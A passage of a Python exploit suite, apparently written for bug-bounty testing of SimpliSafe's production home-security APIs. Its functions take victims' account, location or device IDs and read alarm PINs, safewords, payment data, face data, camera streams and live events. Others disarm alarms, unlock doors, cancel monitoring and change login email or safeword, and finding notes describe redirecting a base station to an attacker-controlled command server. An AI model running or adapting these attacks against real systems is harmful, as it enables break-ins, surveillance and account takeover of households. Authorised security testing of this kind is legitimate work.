                  'If server accepts field write and propagates to base station: '
                  'base station reconnects to attacker C2 on next connection cycle (power cycle, '
                  'network reset, or settings refresh). '
                  'Attacker server receives all sensor events, alarm triggers, status updates. '
                  'Attacker can issue commands to base station as if it were SimpliSafe backend. '
                  'Impact: full infrastructure-level compromise of victim security system. '
                  'Read test: GET /ss3/subscriptions/{victim_sid}/settings?settingsType=SYSTEM with own token; '
                  '200+{admin:{obiwanA:"bb1.simplisafe.com"}} = field exposed, IDOR confirmed on read. '
                  'Write test: POST same endpoint with {admin:{obiwanA:"probe.attacker-controlled.test"}}; '
                  '200/204 = write accepted = CRITICAL C2 redirect capability.'),
    Finding("F42", "CRITICAL", "WiFi PSK Plaintext Exposure via Cloud Normal Settings IDOR (candidate)",
            "yoda", "/ss3/subscriptions/{sid}/settings", "GET", {"settingsType": "NORMAL"},
            verified=False,
            notes='APK: yodaservice/common/SS3NormalSettings.java, SS3NormalSettingsImmutable.java (classes14.dex). '
                  'SS3NormalSettings fields include: wifiSSID (String), wifiPassword (String) — no encryption layer. '
                  'SS3SystemSettings.normal @SerializedName("normal") -> returned when settingsType=NORMAL or ALL. '
                  'Endpoint: GET /ss3/subscriptions/{sid}/settings?settingsType=NORMAL '
                  'or GET /ss3/subscriptions/{sid}/settings?settingsType=all. '
                  'If wifiPassword is returned in plaintext (server may mask/null it): '
                  'IDOR via sid -> victim home/business WiFi PSK exposed directly from cloud REST. '
                  'Simpler read path than F36 (no crypto gymnastics). '
                  'Write attack: POST /ss3/subscriptions/{sid}/settings '
                  '{"settings": {"normal": {"wifiSSID": "victim_ssid", "wifiPassword": "WRONG"}}} '
                  '-> if accepted, base station cannot reconnect after network drop -> monitoring blackout. '
                  'Requires auth + victim sid. '
                  'Test A (read): GET /ss3/subscriptions/{victim_sid}/settings?settingsType=normal -> '
                  'check if response.settings.normal.wifiPassword is non-null/non-masked. '
                  'Test B (write): POST same with wrong password -> confirm base station loses cloud connection. '
                  'VERIFICATION REQUIRED: password may be masked *** server-side — confirm non-null plaintext before asserting CRITICAL.'),
]


# ─── HTTP helpers ───────────────────────────────────────────────────────────────

def _session(token=None):
    headers = {
        "Accept": "application/json",
        "Content-Type": "application/json",
    }
    if token:
        headers["Authorization"] = f"Bearer {token}"
    return headers


def get(url, token=None, **kw):
    try:
        r = req.get(url, impersonate="chrome120", timeout=8,
                    headers=_session(token), **kw)
        return r
    except Exception as e:
        return None


def post(url, token=None, body=None, **kw):
    try:
        r = req.post(url, impersonate="chrome120", timeout=8,
                     headers=_session(token), json=body, **kw)
        return r
    except Exception as e:
        return None


def patch(url, token=None, **kw):
    try:
        r = req.patch(url, impersonate="chrome120", timeout=8,
                      headers=_session(token), **kw)
        return r
    except Exception as e:
        return None


def delete(url, token=None, **kw):
    try:
        r = req.delete(url, impersonate="chrome120", timeout=8,
                       headers=_session(token), **kw)
        return r
    except Exception as e:
        return None


def _print(tag, status, msg):
    sym = {"CRIT": "!!!", "HIGH": "!", "OK": "ok", "INFO": "--", "FAIL": "xx"}.get(tag, tag)
    print(f"[{sym}] {status:3}  {msg}")


# ─── Unauthenticated Surface ────────────────────────────────────────────────────

def probe_apphub_swagger():
    """F24: App-hub Swagger UI + spec exposed without auth; reveals internal codenames and admin scope."""
    import urllib.request, ssl as _ssl
    ctx = _ssl.create_default_context()
    base = "https://app-hub.prd.aser.simplisafe.com"
    print("\n=== F24 — App-Hub Swagger UI + Spec Exposure ===")

    # /docs — Swagger UI
    try:
        r = urllib.request.urlopen(
            urllib.request.Request(base + "/docs", headers={"User-Agent": "Mozilla/5.0"}),
            context=ctx, timeout=8)
        body = r.read(200).decode(errors='replace')
        if 'swagger' in body.lower():
            _print("HIGH", r.status_code, f"app_hub/docs -> Swagger UI (no auth)")
    except Exception:
        pass

    # /v1/swagger — full spec
    try:
        r = urllib.request.urlopen(
            urllib.request.Request(base + "/v1/swagger",
                headers={"User-Agent": "Mozilla/5.0", "Accept": "application/json"}),
            context=ctx, timeout=10)
        raw = r.read()
        spec = json.loads(raw)
        path_count = len(spec.get('paths', {}))
        _print("HIGH", r.status_code,
               f"app_hub/v1/swagger -> {len(raw)//1024}KB OpenAPI spec {path_count} paths "
               f"| admin scope: app-hub.aser.simplisafe.com/admin:config")
    except Exception:
        pass

    # /health — internal codenames
    try:
        r = urllib.request.urlopen(
            urllib.request.Request(base + "/health", headers={"User-Agent": "Mozilla/5.0"}),
            context=ctx, timeout=8)
        body = r.read(256).decode(errors='replace')
        d = json.loads(body)
        errors = [k for k, v in d.items() if v == "error"]
        _print("HIGH", r.status_code,
               f"app_hub/health internal codenames; services in ERROR: {errors}")
    except Exception:
        pass


def probe_otel_injection():
    """F23: Verify unauthenticated OTLP injection across all three signal types."""
    base = SERVICES["otel_collector"]
    ts = "1725897600000000000"
    payloads = {
        "/v1/traces": {"resourceSpans": [{"resource": {"attributes": [{"key": "service.name", "value": {"stringValue": "ss-re-probe"}}]},
            "scopeSpans": [{"scope": {"name": "ss-re"}, "spans": [{"traceId": "aaaabbbbccccdddd0000111122223333",
            "spanId": "aabbccdd11223344", "name": "unauth-probe", "startTimeUnixNano": ts,
            "endTimeUnixNano": ts, "kind": 1}]}]}]},
        "/v1/logs": {"resourceLogs": [{"resource": {"attributes": [{"key": "service.name", "value": {"stringValue": "ss-re-probe"}}]},
            "scopeLogs": [{"scope": {"name": "ss-re"}, "logRecords": [{"timeUnixNano": ts,
            "severityText": "INFO", "body": {"stringValue": "unauth-log-injection-probe"}}]}]}]},
        "/v1/metrics": {"resourceMetrics": [{"resource": {"attributes": [{"key": "service.name", "value": {"stringValue": "ss-re-probe"}}]},
            "scopeMetrics": [{"scope": {"name": "ss-re"}, "metrics": [{"name": "probe.counter",
            "sum": {"dataPoints": [{"startTimeUnixNano": ts, "timeUnixNano": ts, "asInt": "1"}],
            "aggregationTemporality": 2}}]}]}]},
    }
    print("\n=== F23 — OTel Unauthenticated Injection ===")
    for path, body in payloads.items():
        r = post(base + path, body=body)
        if r and r.status_code == 200:
            _print("HIGH", r.status_code, f"otel_collector{path} -> {r.text[:60]}  INJECTION ACCEPTED")
        else:
            status = r.status_code if r else "ERR"
            _print("INFO", status, f"otel_collector{path}")


def probe_unauth():
    print("\n=== Unauthenticated Surface ===")

    # Health endpoints
    health_targets = [
        ("beta_hub", "/health"),
        ("telegram", "/health"),
        ("socketlink", "/health"),
        ("mediator", "/health"),
        ("pcs", "/health-check"),
        ("lumen", "/"),
    ]
    for svc, path in health_targets:
        r = get(SERVICES[svc] + path)
        if r and r.status_code == 200:
            _print("HIGH", r.status_code, f"{svc}{path}  {r.text[:80]}")
        elif r:
            _print("INFO", r.status_code, f"{svc}{path}")

    # PCS OpenAPI spec
    r = get(SERVICES["pcs"] + "/openapi.json")
    if r and r.status_code == 200:
        spec = r.json()
        path_count = len(spec.get("paths", {}))
        _print("CRIT", r.status_code, f"PCS OpenAPI spec exposed — {path_count} paths, {len(r.content)//1024}KB")
    else:
        _print("INFO", r.status_code if r else "ERR", "PCS /openapi.json")

    # Address validation
    r = post(SERVICES["address_validation"] + "/v1/addresses",
             body=[{"street": "1600 Pennsylvania Ave NW", "city": "Washington",
                    "state": "DC", "zipcode": "20500"}])
    if r and r.status_code == 200:
        data = r.json()
        lat = data["matches"][0]["metadata"]["geolocation"]["latitude"]
        lon = data["matches"][0]["metadata"]["geolocation"]["longitude"]
        _print("HIGH", r.status_code, f"Address geocoding unauthenticated — lat={lat} lon={lon}")
    else:
        _print("INFO", r.status_code if r else "ERR", "Address validation")

    # Video-signed endpoint (no auth required per OpenAPI)
    r = get(SERVICES["pcs"] + "/video-signed/test123")
    if r and r.status_code == 400:
        _print("HIGH", r.status_code, "pcs/video-signed/ — 400 not 401, auth middleware absent")
    elif r:
        _print("INFO", r.status_code, f"pcs/video-signed/ {r.text[:60]}")

    # F19: Email oracle
    for email in ["test@example.com", "xzqjwvmno9843756@example.com"]:
        r = get(SERVICES["app_hub"] + f"/v1/users/email/{email}")
        if r and r.status_code == 200:
            _print("HIGH", 200, f"email oracle {email} -> {r.json().get('exists')}")

    # F20: SocketLink status
    r = get(SERVICES["socketlink"] + "/status")
    if r and r.status_code == 200:
        d = r.json()
        _print("HIGH", 200, f"socketlink/status clients={d.get('clients')} namespaces={d.get('namespaces')}")

    # F21: Mediator metrics
    r = get(SERVICES["mediator"] + "/metrics")
    if r and r.status_code == 200:
        lines = [l for l in r.text.split('\n') if 'pod=' in l]
        _print("HIGH", 200, f"mediator/metrics -> pod={lines[0][:80] if lines else 'unknown'}")

    # F22: Server header git commit disclosure (systemic — 3 services)
    import urllib.request, ssl as _ssl
    ctx = _ssl.create_default_context()
    for svc_url in [
        "https://location-grant-authorizations.prd.services.simplisafe.com/locations/x",
        "https://address-validation.prd.platform.simplisafe.com/v1/addresses",
        "https://sscr.prd.platform.simplisafe.com/health",
    ]:
        try:
            rq = urllib.request.Request(svc_url, headers={"User-Agent": "SimpliSafe/8.3.0"})
            urllib.request.urlopen(rq, context=ctx, timeout=5)
        except urllib.error.HTTPError as e:
            srv = e.headers.get("server", "")
            trace = e.headers.get("traceresponse", "")
            host = svc_url.split("//")[1].split("/")[0]
            if srv:
                _print("INFO", e.code, f"{host}  server: {srv}  traceresponse: {trace[:40]}")

    # F23: OTel full-signal injection
    probe_otel_injection()

    # F24: App-hub Swagger + spec exposure
    probe_apphub_swagger()


def test_safeword_idor(token, victim_account_id):
    """F25: Safeword exposure via preactivation accountId IDOR."""
    print(f"\n=== F25 — Safeword IDOR (victim_account_id={victim_account_id}) ===")
    url = f"{SERVICES['gateway']}/v1/preactivations/preactivations/account/{victim_account_id}"
    r = get(url, token=token)
    if not r:
        print("  Request failed")
        return
    if r.status_code == 200:
        try:
            d = r.json()
            preactivations = d.get("preactivations", [])
            for p in preactivations:
                monitoring = p.get("monitoringLocation", {})
                dispatcher = monitoring.get("dispatcherInfo", {})
                safeword = dispatcher.get("safeword")
                if safeword:
                    _print("CRIT", 200,
                           f"SAFEWORD EXPOSED for account {victim_account_id}: '{safeword}'")
                else:
                    _print("INFO", 200, f"Response OK but no safeword field: {str(dispatcher)[:80]}")
        except Exception as e:
            _print("INFO", 200, f"Response parse error: {e}")
    else:
        _print("INFO", r.status_code, f"preactivations/{victim_account_id}: {r.text[:100]}")


def test_cancel_subscription_idor(token, victim_sid):
    """F-cancel: Cancel victim's monitoring subscription (IDOR if sid not validated)."""
    print(f"\n=== Cancel Subscription IDOR (victim_sid={victim_sid}) ===")
    confirm = input(f"  Attempt subscription cancellation on victim_sid={victim_sid}? [y/N] ").strip().lower()
    if confirm != "y":
        print("  Skipped.")
        return
    r = post(f"{SERVICES['app_hub']}/v1/subscriptions/{victim_sid}/cancellations",
             token=token, body={"cancellationReason": "OTHER"})
    if r:
        _print("CRIT" if r.status_code == 200 else "INFO", r.status_code,
               f"cancel sub {victim_sid}  {r.text[:100]}")


def test_monitoring_idor(token, victim_location_id):
    """F26: Hidden monitoring endpoints — IDOR test against victim locationId."""
    print(f"\n=== F26 — Monitoring IDOR (victim_location_id={victim_location_id}) ===")
    base = SERVICES["app_hub"]
    for path, label in [
        (f"/monitoring/v1/locations/{victim_location_id}/alarms", "alarm history"),
        (f"/monitoring/v1/locations/{victim_location_id}/alarms/latest", "latest alarm"),
        (f"/monitoring/v1/locations/{victim_location_id}/permits", "permits"),
        (f"/monitoring/v2/locations/{victim_location_id}/features", "features"),
    ]:
        r = get(base + path, token=token)
        if r:
            sev = "CRIT" if r.status_code == 200 else "INFO"
            _print(sev, r.status_code, f"{label}  {r.text[:100]}")


def test_alarm_pin_idor(token, victim_sid):
    """F27: Read all alarm PINs for victim SID (master, custom, duress)."""
    print(f"\n=== F27 — Alarm PIN IDOR (victim_sid={victim_sid}) ===")
    r = get(f"{SERVICES['yoda']}/subscriptions/{victim_sid}/pins?cached=false", token=token)
    if not r:
        print("  Request failed"); return
    if r.status_code == 200:
        try:
            d = r.json()
            pins = d.get("pins", d)
            master = pins.get("masterPin") or pins.get("master", {}).get("pin")
            duress = pins.get("duressPin") or pins.get("duress", {}).get("pin")
            customs = [v for k, v in pins.items() if "custom" in k.lower()]
            _print("CRIT", 200,
                   f"PINS EXPOSED sid={victim_sid} master={master} duress={duress} custom={customs}")
        except Exception as e:
            _print("CRIT", 200, f"200 OK (parse error: {e}) raw={r.text[:200]}")
    else:
        _print("INFO", r.status_code, f"pins/{victim_sid}: {r.text[:100]}")


def test_scheduled_arm_idor(token, victim_location_id):
    """F28: Read/modify victim's automated arm/disarm schedule."""
    print(f"\n=== F28 — Scheduled Arm IDOR (victim_location_id={victim_location_id}) ===")
    base = SERVICES["app_hub"]
    r = get(f"{base}/v1/scheduledEvents/locations/{victim_location_id}", token=token)
    if not r:
        print("  Request failed"); return
    if r.status_code == 200:
        _print("CRIT", 200, f"SCHEDULE READ locationId={victim_location_id}: {r.text[:200]}")
    else:
        _print("INFO", r.status_code, f"scheduledEvents/{victim_location_id}: {r.text[:100]}")


def test_firebase_token_idor(token, victim_uid):
    """F29: Obtain victim's Firebase custom token (Firestore identity takeover)."""
    print(f"\n=== F29 — Firebase Token IDOR (victim_uid={victim_uid}) ===")
    r = get(f"{SERVICES['app_hub']}/v1/users/{victim_uid}/firebaseCredentials", token=token)
    if not r:
        print("  Request failed"); return
    if r.status_code == 200:
        try:
            d = r.json()
            custom_token = d.get("customToken") or d.get("token")
            if custom_token:
                _print("CRIT", 200,
                       f"FIREBASE TOKEN OBTAINED uid={victim_uid} token={custom_token[:40]}...")
            else:
                _print("CRIT", 200, f"200 OK raw={r.text[:200]}")
        except Exception as e:
            _print("CRIT", 200, f"200 OK (parse err: {e}) raw={r.text[:200]}")
    else:
        _print("INFO", r.status_code, f"firebaseCredentials/{victim_uid}: {r.text[:100]}")


def test_admin_settings_idor(token, victim_sid):
    """F30: Read/write victim's admin settings — persistent monitoring disable."""
    print(f"\n=== F30 — Admin Settings IDOR (victim_sid={victim_sid}) ===")
    base = SERVICES["yoda"]
    r = get(f"{base}/ss3/subscriptions/{victim_sid}/settings/admin", token=token)
    if not r:
        print("  Request failed"); return
    if r.status_code == 200:
        try:
            d = r.json()
            admin = d.get("admin", d)
            monitoring = admin.get("monitoring")
            jam = admin.get("jamDetectionEnable")
            rearm = admin.get("autoRearm")
            _print("CRIT", 200,
                   f"ADMIN SETTINGS READ sid={victim_sid} monitoring={monitoring} "
                   f"jamDetect={jam} autoRearm={rearm} raw={str(admin)[:100]}")
        except Exception as e:
            _print("CRIT", 200, f"200 OK (parse err: {e}) raw={r.text[:200]}")
    else:
        _print("INFO", r.status_code, f"settings/admin/{victim_sid}: {r.text[:100]}")


# ─── IDOR Test Suite ────────────────────────────────────────────────────────────

def test_alarm_state_idor(token, own_sid, victim_sid):
    """F8: Can we read/write victim alarm state with own token?"""
    print(f"\n=== F8 — Alarm State IDOR (victim_sid={victim_sid}) ===")

    # Read victim alarm state
    r = get(f"{SERVICES['yoda']}/ss3/subscriptions/{victim_sid}/state", token=token)
    if r:
        _print("CRIT" if r.status_code == 200 else "INFO", r.status_code,
               f"GET victim alarm state  {r.text[:100]}")

    # Attempt disarm
    confirm = input(f"  Attempt disarm on victim_sid={victim_sid}? [y/N] ").strip().lower()
    if confirm == "y":
        r = post(f"{SERVICES['yoda']}/ss3/subscriptions/{victim_sid}/state/off",
                 token=token)
        if r:
            _print("CRIT" if r.status_code == 200 else "INFO", r.status_code,
                   f"POST disarm  {r.text[:100]}")
    else:
        print("  Skipped disarm attempt.")


def test_alarm_state_read(token, victim_uid):
    """F9: Can we read victim's alarm state via userId IDOR?"""
    print(f"\n=== F9 — Alarm State Read IDOR (victim_uid={victim_uid}) ===")
    r = get(f"{SERVICES['yoda']}/accounts/{victim_uid}/locations/alarmState", token=token)
    if r:
        _print("CRIT" if r.status_code == 200 else "INFO", r.status_code,
               f"alarmState  {r.text[:150]}")


def test_location_enum(token, victim_uid):
    """Can we enumerate victim's locations?"""
    print(f"\n=== Location Enum IDOR (victim_uid={victim_uid}) ===")
    r = get(f"{SERVICES['yoda']}/accounts/{victim_uid}/locations", token=token)
    if r:
        _print("CRIT" if r.status_code == 200 else "INFO", r.status_code,
               f"locations  {r.text[:150]}")


def test_camera_token_idor(token, victim_sid):
    """F11: Can we get a camera provisioning token for a victim's sid?"""
    print(f"\n=== F11 — Camera Token IDOR (victim_sid={victim_sid}) ===")
    r = post(f"{SERVICES['yoda']}/cameras/provisioningToken",
             token=token, body={"sid": str(victim_sid)})
    if r:
        if r.status_code == 200:
            data = r.json()
            tok = data.get("token", "")[:40]
            exp = data.get("expires_in", "")
            _print("CRIT", 200, f"Camera token obtained — token={tok}... expires_in={exp}")
        else:
            _print("INFO", r.status_code, f"{r.text[:100]}")


def test_sensor_enum(token, victim_sid):
    """IDOR: list victim's sensors"""
    print(f"\n=== Sensor Enum IDOR (victim_sid={victim_sid}) ===")
    r = get(f"{SERVICES['yoda']}/ss3/subscriptions/{victim_sid}/sensors", token=token)
    if r:
        _print("CRIT" if r.status_code == 200 else "INFO", r.status_code,
               f"sensors  {r.text[:150]}")


def test_grant_auth_idor(token, victim_grantee_id):
    """F1: Can we read victim's grant authorizations? (30% bonus)"""
    print(f"\n=== F1 — Grant Auth IDOR (victim_grantee_id={victim_grantee_id}) ===")
    r = get(f"{SERVICES['location_auth']}/grantees/{victim_grantee_id}", token=token)
    if r:
        _print("CRIT" if r.status_code == 200 else "INFO", r.status_code,
               f"grantees  {r.text[:200]}")


def test_grant_revoke_idor(token, victim_location_id, victim_email):
    """F2: Can we revoke victim's access to their own location? (30% bonus)"""
    print(f"\n=== F2 — Grant Revoke IDOR (victim_location={victim_location_id}) ===")
    confirm = input(f"  Attempt revoke on location={victim_location_id}, email={victim_email}? [y/N] ").strip().lower()
    if confirm == "y":
        r = post(f"{SERVICES['location_auth']}/locations/{victim_location_id}/revoke",
                 token=token,
                 body={"granteeEmail": victim_email, "role": "MANAGER"})
        if r:
            _print("CRIT" if r.status_code == 200 else "INFO", r.status_code,
                   f"revoke  {r.text[:150]}")
    else:
        print("  Skipped revoke attempt.")


def test_push_notif_idor(token, victim_uid, victim_device):
    """F3: Can we delete victim's push notification device?"""
    print(f"\n=== F3 — Push Notif IDOR (victim_uid={victim_uid}, device={victim_device}) ===")
    url = f"{SERVICES['telegram']}/v1/registrations/users/{victim_uid}/pushRegistrations/devices/{victim_device}"
    r = delete(url, token=token)
    if r:
        _print("CRIT" if r.status_code == 200 else "INFO", r.status_code,
               f"delete push device  {r.text[:100]}")


def test_socketlink_idor(token, victim_uid, listen_seconds=10):
    """F17: Subscribe to victim's real-time event stream using own token but victim uid."""
    print(f"\n=== F17 — SocketLink Surveillance IDOR (victim_uid={victim_uid}) ===")
    try:
        import websocket
        import json as _json
        import time as _time
        import datetime

        results = []

        def on_open(ws):
            payload = {
                "datacontenttype": "application/json",
                "id": f"ts{int(_time.time() * 1000)}",
                "source": "ablation-re-test",
                "specversion": "1.0",
                "time": datetime.datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ"),
                "type": "com.simplisafe.connection.identify",
                "data": {
                    "auth": {"schema": "bearer", "token": token},
                    "join": [f"uid:{victim_uid}"]
                }
            }
            ws.send(_json.dumps(payload))
            _print("INFO", "SENT", f"identify with uid:{victim_uid}")

        def on_message(ws, msg):
            _print("CRIT", "RECV", f"{msg[:200]}")
            results.append(msg)
            try:
                d = _json.loads(msg)
                if d.get("type") == "com.simplisafe.namespace.subscribed":
                    _print("CRIT", "IDOR", f"Subscribed to uid:{victim_uid} namespace — CONFIRMED")
            except Exception:
                pass

        def on_error(ws, err):
            _print("INFO", "ERR", str(err)[:100])

        ws_url = "wss://socketlink.prd.aser.simplisafe.com/socket.io/?transport=websocket"
        ws = websocket.WebSocketApp(ws_url,
                                     header={"Authorization": f"Bearer {token}"},
                                     on_open=on_open,
                                     on_message=on_message,
                                     on_error=on_error)
        import threading
        t = threading.Thread(target=ws.run_forever, kwargs={"sslopt": {"cert_reqs": 0}})
        t.daemon = True
        t.start()
        _time.sleep(listen_seconds)
        ws.close()
        print(f"  {len(results)} messages received in {listen_seconds}s")
    except ImportError:
        print("  websocket-client not installed: pip install websocket-client")


def test_camera_stream_idor(token, victim_camera_uuid):
    """F6: Can we access victim's camera stream with own token?"""
    print(f"\n=== F6 — Camera Stream IDOR (uuid={victim_camera_uuid}) ===")
    r = get(f"{SERVICES['tep']}/v1/{victim_camera_uuid}/mjpg?fr=1&x=1024",
            token=token)
    if r:
        _print("CRIT" if r.status_code == 200 else "INFO", r.status_code,
               f"camera stream  {r.headers.get('content-type', '')}  {r.text[:80]}")


def probe_email_oracle(emails: list):
    """F19: Email enumeration oracle — no auth required."""
    print("\n=== F19 — Email Enumeration Oracle (unauthenticated) ===")
    for email in emails:
        r = get(f"{SERVICES['app_hub']}/v1/users/email/{email}")
        if r and r.status_code == 200:
            data = r.json()
            _print("HIGH", 200, f"{email} -> exists={data.get('exists')}")
        elif r:
            _print("INFO", r.status_code, f"{email} -> {r.text[:60]}")


def probe_socketlink_status():
    """F20: SocketLink real-time metrics — no auth required."""
    print("\n=== F20 — SocketLink Status (unauthenticated) ===")
    for path in ["/health", "/status"]:
        r = get(f"{SERVICES['socketlink']}{path}")
        if r and r.status_code == 200:
            _print("HIGH", 200, f"socketlink{path} -> {r.text[:100]}")
        elif r:
            _print("INFO", r.status_code, f"socketlink{path}")


def probe_mediator_metrics():
    """F21: Camera mediator Prometheus metrics — no auth required."""
    print("\n=== F21 — Mediator Prometheus Metrics (unauthenticated) ===")
    r = get(f"{SERVICES['mediator']}/metrics")
    if r and r.status_code == 200:
        lines = r.text.split('\n')
        pod_lines = [l for l in lines if 'pod=' in l][:5]
        _print("HIGH", 200, f"mediator/metrics -> {len(lines)} lines, pods: {pod_lines[:2]}")
    elif r:
        _print("INFO", r.status_code, "mediator/metrics")


def test_communications_idor(token, victim_account_id, victim_location_id, own_device_id):
    """App-comm IDOR: read victim's in-app messages/security alerts."""
    print(f"\n=== App-Comm IDOR (victim_acct={victim_account_id}, loc={victim_location_id}) ===")
    base = f"{SERVICES['gateway']}/app-communications"
    r = get(f"{base}/v1/accounts/{victim_account_id}/locations/{victim_location_id}/messages"
            f"?mobileDeviceId={own_device_id}&region=en-US&subChannel=INBOX",
            token=token)
    if r:
        _print("CRIT" if r.status_code == 200 else "INFO", r.status_code,
               f"comm messages  {r.text[:150]}")


def test_sensor_data_idor(token, victim_serial, victim_location_id):
    """Sensor data IDOR: real-time sensor state for victim's system."""
    print(f"\n=== Sensor Data IDOR (serial={victim_serial}, loc={victim_location_id}) ===")
    r = get(f"{SERVICES['devices']}/v1/{victim_serial}/{victim_location_id}/sensors",
            token=token)
    if r:
        _print("CRIT" if r.status_code == 200 else "INFO", r.status_code,
               f"sensors  {r.text[:150]}")


def test_face_idor(token, victim_sid, limit=5):
    """Face recognition IDOR: read victim's biometric face database."""
    print(f"\n=== Face IDOR (victim_sid={victim_sid}) ===")
    r = get(f"{SERVICES['lumen']}/v1/face/{victim_sid}/rated?limit={limit}",
            token=token)
    if r:
        _print("CRIT" if r.status_code == 200 else "INFO", r.status_code,
               f"face/rated  {r.text[:150]}")


def test_logininfo_idor(token, victim_uid, own_password):
    """F34: Attempt email change on victim account using own credential as oldPassword."""
    print(f"\n=== F34 — loginInfo ATO IDOR (victim_uid={victim_uid}) ===")
    r = post(f"{SERVICES['yoda']}/v1/users/{victim_uid}/loginInfo", token=token,
             json={"email": "idor-test-probe@example.invalid", "oldPassword": own_password})
    if not r:
        print("  Request failed"); return
    if r.status_code in (200, 201, 204):
        _print("CRIT", r.status_code,
               f"EMAIL CHANGE SUCCEEDED uid={victim_uid} — ATO email redirect possible!")
    elif r.status_code == 400:
        _print("INFO", 400, f"400 — likely oldPassword rejected (server validates against victim, not attacker): {r.text[:100]}")
    else:
        _print("INFO", r.status_code, f"loginInfo/{victim_uid}: {r.text[:100]}")


def test_doorlock_idor(token, victim_sid, victim_serial=None):
    """F33: Enumerate victim's door locks + attempt remote unlock."""
    print(f"\n=== F33 — Door Lock IDOR (victim_sid={victim_sid}) ===")
    r = get(f"{SERVICES['yoda']}/v1/doorlock/{victim_sid}", token=token)
    if not r:
        print("  Request failed"); return
    if r.status_code == 200:
        try:
            locks = r.json() if isinstance(r.json(), list) else [r.json()]
            serials = []
            for lk in locks:
                s = lk.get("serial")
                name = lk.get("name")
                status = lk.get("status", {})
                serials.append(s)
                _print("CRIT", 200, f"LOCK ENUM sid={victim_sid} serial={s} name={name} status={status}")
            if victim_serial or (serials and serials[0]):
                target_serial = victim_serial or serials[0]
                r2 = post(f"{SERVICES['yoda']}/v1/doorlock/{victim_sid}/{target_serial}/state",
                          token=token, json={"state": "UNLOCK"})
                if r2 and r2.status_code in (200, 201, 204):
                    _print("CRIT", r2.status_code, f"DOOR UNLOCKED sid={victim_sid} serial={target_serial}")
                elif r2:
                    _print("INFO", r2.status_code, f"unlock attempt: {r2.text[:100]}")
        except Exception as e:
            _print("CRIT", 200, f"200 OK (parse err: {e}) raw={r.text[:200]}")
    else:
        _print("INFO", r.status_code, f"doorlock/{victim_sid}: {r.text[:100]}")


def test_payment_profile_idor(token, victim_uid):
    """F32: Read victim's stored payment profile tokens + full billing address."""
    print(f"\n=== F32 — Payment Profile IDOR (victim_uid={victim_uid}) ===")
    r = get(f"{SERVICES['yoda']}/v1/users/{victim_uid}/paymentMethods", token=token)
    if not r:
        print("  Request failed"); return
    if r.status_code == 200:
        try:
            profiles = r.json()
            if not isinstance(profiles, list):
                profiles = [profiles]
            for p in profiles[:2]:
                pid = p.get("paymentProfileId")
                cc = p.get("ccNumber") or p.get("lastFour")
                cvv = p.get("ccCvv")
                addr = p.get("address", {})
                name = f"{addr.get('firstName','')} {addr.get('lastName','')}".strip()
                street = addr.get("street1")
                _print("CRIT", 200,
                       f"PAYMENT PROFILE uid={victim_uid} id={pid} last4={cc} "
                       f"cvv={'PRESENT:'+str(cvv) if cvv else 'null'} "
                       f"name={name} street={street}")
        except Exception as e:
            _print("CRIT", 200, f"200 OK (parse err: {e}) raw={r.text[:200]}")
    else:
        _print("INFO", r.status_code, f"paymentMethods/{victim_uid}: {r.text[:100]}")


def test_monitoring_feature_idor(token, victim_location_id):
    """F31: Read/disable LiveGuard or VisualVerification features on victim location."""
    print(f"\n=== F31 — Monitoring Feature Flag IDOR (victim_location_id={victim_location_id}) ===")
    base = SERVICES["app_hub"]
    r = get(f"{base}/monitoring/v2/locations/{victim_location_id}/features", token=token)
    if not r:
        print("  Request failed"); return
    if r.status_code == 200:
        try:
            features = r.json()
            flags = {f.get("name"): f.get("enabled") for f in (features if isinstance(features, list) else features.get("features", []))}
            lgp = flags.get("LiveGuardProtection")
            vv = flags.get("VisualVerification")
            _print("CRIT", 200,
                   f"FEATURES READ locationId={victim_location_id} LiveGuardProtection={lgp} VisualVerification={vv} all={flags}")
        except Exception as e:
            _print("CRIT", 200, f"200 OK (parse err: {e}) raw={r.text[:200]}")
    else:
        _print("INFO", r.status_code, f"features/{victim_location_id}: {r.text[:100]}")


def test_location_settings_idor(token, victim_uid, victim_sid, victim_location_id=None,
                               attacker_safeword="ABLATION-PROBE-1234"):
    """F35: Read safeWord via GET locations/{locationId}/all + change it via POST activation."""
    print(f"\n=== F35 — Emergency Dispatch IDOR (uid={victim_uid}, sid={victim_sid}) ===")
    # Step 1a: primary read path — GET /locations/{locationId}/all (locationId = victim_sid or locationId)
    loc_id = victim_location_id or victim_sid
    r = get(f"{SERVICES['yoda']}/locations/{loc_id}/all", token=token)
    if r and r.status_code == 200:
        try:
            data = r.json()
            loc = data.get("location", data)
            di = loc.get("dispatcherInfo", {})
            sw = di.get("safeWord")
            contacts = loc.get("contacts", {})
            addr = loc.get("address", {})
            _print("CRIT", 200,
                   f"LOCATION ALL locationId={loc_id} safeWord={sw} "
                   f"numAdults={di.get('numAdults')} "
                   f"street={addr.get('street1','?')} contacts={contacts}")
        except Exception as e:
            _print("CRIT", 200, f"200 (parse err: {e}) raw={r.text[:200]}")
    else:
        _print("INFO", r.status_code if r else 0,
               f"locations/{loc_id}/all: {r.text[:80] if r else 'no response'}")
    # Step 1b: fallback read — subscription settings
    r = get(f"{SERVICES['yoda']}/ss3/subscriptions/{victim_sid}/settings?settingsType=GENERAL",
            token=token)
    if r and r.status_code == 200:
        try:
            data = r.json()
            sw = data.get("settings", {}).get("safeWord") or data.get("safeWord")
            _print("CRIT", 200, f"SAFEWORD READ (settings) sid={victim_sid} safeWord={sw}")
        except Exception as e:
            _print("CRIT", 200, f"200 (parse err: {e})")
    # Step 2: write probe — only modifies safeWord
    body = {"safeWord": attacker_safeword}
    r2 = post(f"{SERVICES['yoda']}/activation/{victim_uid}/{victim_sid}/location",
              token=token, params={"country": "US"}, json=body)
    if not r2:
        print("  POST failed"); return
    if r2.status_code in (200, 201, 204):
        _print("CRIT", r2.status_code,
               f"SAFEWORD CHANGED uid={victim_uid} sid={victim_sid} -> {attacker_safeword}")
    else:
        _print("INFO", r2.status_code, f"location update: {r2.text[:100]}")


def test_wifi_credentials_idor(token, victim_serial, victim_sid):
    """F36: Redirect WiFi PSK encryption to attacker key by sending own X25519 pubkey for victim serial+sid."""
    import os, base64
    from cryptography.hazmat.primitives.asymmetric.x25519 import X25519PrivateKey
    from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat
    from cryptography.hazmat.primitives.kdf.hkdf import HKDF
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    print(f"\n=== F36 — WiFi Credentials IDOR (serial={victim_serial}, sid={victim_sid}) ===")
    attacker_priv = X25519PrivateKey.generate()
